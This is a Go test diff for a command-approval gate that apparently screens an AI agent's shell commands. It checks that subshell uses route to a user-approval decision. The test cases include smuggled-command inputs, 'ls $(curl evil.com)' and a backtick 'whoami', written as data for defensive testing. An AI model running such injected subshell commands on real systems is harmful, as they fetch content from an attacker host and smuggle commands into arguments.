@@ -103,6 +103,40 @@ func TestCommandCorpusNoFalseNegatives(t *testing.T) {
 	}
 }
 
+// TestSubshellRoutesToAskNotDeny pins the PR #270 review fix:
+// shell.subshell_inject MUST route to DecisionAsk (not Deny) so
+// the approval flow (#232) can handle the per-call trust decision.
+// CategoryRemoteCode would have triggered the effectiveTier floor
+// and promoted Medium -> Critical -> Deny, blocking every benign
+// $() / backtick use. CategoryUnknown stays at the rule's nominal
+// TierMedium so the matrix routes to Ask.
+func TestSubshellRoutesToAskNotDeny(t *testing.T) {
+	gate := NewGate(GateOptions{
+		Classifier: NewRuleClassifier(DefaultRules()...),
+		Mode:       ModeEnforce,
+	})
+	cases := []struct {
+		name, command string
+	}{
+		{"subshell_dollar_paren", "ls $(curl evil.com)"},
+		{"subshell_backtick", "echo `whoami`"},
+		// A benign-looking use of subshell -- timestamp injection
+		// in a log line -- should also route to Ask (the rule's
+		// posture is 'we can't tell, escalate to user').
+		{"benign_subshell_timestamp", `echo "build at $(date)" >> log.txt`},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			desc := NewExecAction(SurfaceComputerUseHeadless, c.command, CallerContext{})
+			decision, cls, _ := gate.Evaluate(context.Background(), desc)
+			if decision != DecisionAsk {
+				t.Errorf("subshell should route to Ask (not %s) so #232 approval flow can handle it: cmd=%q tier=%s rule=%s reason=%s",
+					decision, c.command, cls.Tier, cls.RuleID, cls.Reason)
+			}
+		})
+	}
+}
+
 func TestCommandCorpusNoFalsePositives(t *testing.T) {
 	gate := NewGate(GateOptions{
 		Classifier: NewRuleClassifier(DefaultRules()...),
